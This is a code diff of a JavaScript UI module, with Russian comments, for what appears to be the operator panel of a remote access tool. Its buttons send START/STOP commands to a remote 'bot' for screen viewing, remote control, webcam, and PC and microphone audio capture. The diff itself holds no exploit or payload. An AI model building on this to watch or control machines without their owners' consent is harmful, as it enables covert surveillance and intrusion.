@@ -1,39 +1,48 @@
 // frontend/client_control/js/modules/ui/header.js
+
 import { AppState } from '../core/states.js';
 
+/** Инициализация кнопок управления V8.0 **/
 export const initHeaderControls = () => {
   const $ = id => document.getElementById(id);
   
-  // Конфигурация строго по ТЗ V7.2
-  // Модули: ScreenView, RemoteControl, Webcam. Мета: None
   const actions = [
-    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView:None' },
-    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl:None' },
-    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam:None' },
-    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse:PC' },
-    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse:Mic' }
+    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView' },
+    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl' },
+    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam' },
+    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', extra: 'PC' },
+    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', extra: 'Mic' }
   ];
 
+  /** Переключение START/STOP и визуализация **/
   const toggleAction = (a, force = null, silent = false) => {
-    const btn = $(a.id), state = force ?? !a.ref[a.key];
-    if (a.ref[a.key] === state && force === null) return;
-    
-    a.ref[a.key] = state;
-    btn?.classList.toggle('active', state);
+      const btn = $(a.id), state = force ?? !a.ref[a.key];
+      if (a.ref[a.key] === state && force === null) return;
+      
+      a.ref[a.key] = state;
+      btn?.classList.toggle('active', state);
 
-    if (a.id === 'btn-desktop-control') {
-      const cvs = $('desktopCanvas');
-      cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
-      state && cvs?.focus();
-    }
+      if (a.id === 'btn-desktop-control') {
+        const cvs = $('desktopCanvas');
+        cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
+        state && cvs?.focus();
+      }
 
-    // ТЗ V7.2: payload 1 или 0 (window.sendToBot упакует это в 4 байта BigEndian)
-    if (!silent && window.sendToBot) {
-        window.sendToBot(a.mod, state ? 1 : 0);
-    }
+      // ИСПРАВЛЕНО: Используем правильный ID из AppState
+      const targetBot = AppState.clientId; 
+      const actionCmd = state ? 'START' : 'STOP';
+      
+      console.log(`[UI:Header] Action: ${a.mod} | Cmd: ${actionCmd} | Bot: ${targetBot}`);
+
+      if (!silent && window.sendToBot) {
+          // Добавлен аргумент PAYLOAD (пустая строка для команд управления)
+          window.sendToBot(a.mod, "", actionCmd, a.extra || 'none');
+      } else if (!window.sendToBot) {
+          console.error(`[UI:Header] CRITICAL: window.sendToBot is undefined!`);
+      }
   };
 
-  // ... остальной код (setupToggle и т.д.) без изменений
+  /** Обработка оверлеев **/
   const setupToggle = (id, ovlId, onOpen) => {
     const btn = $(id), ovl = $(ovlId);
     if (!btn || !ovl) return;
@@ -56,6 +65,7 @@ export const initHeaderControls = () => {
     el && (el.onclick = () => toggleAction(a));
   });
 
+  /** Авто-стоп конфликтующих ресурсов **/
   window.syncModeResources = mode => {
     const termOvl = $('terminal-overlay'), filesOvl = $('files-overlay');
     const termBtn = $('btn-terminal-toggle'), filesBtn = $('btn-files-toggle');
@@ -64,10 +74,10 @@ export const initHeaderControls = () => {
     [termBtn, filesBtn].forEach(el => el?.classList.remove('active'));
     
     if (mode === 'webcam') {
-      toggleAction(actions[0], false); // Stop ScreenView
-      toggleAction(actions[1], false); // Stop RemoteControl
+      toggleAction(actions[0], false); 
+      toggleAction(actions[1], false); 
     } else if (mode === 'desktop') {
-      toggleAction(actions[2], false); // Stop Webcam
+      toggleAction(actions[2], false); 
     }
   };
 };
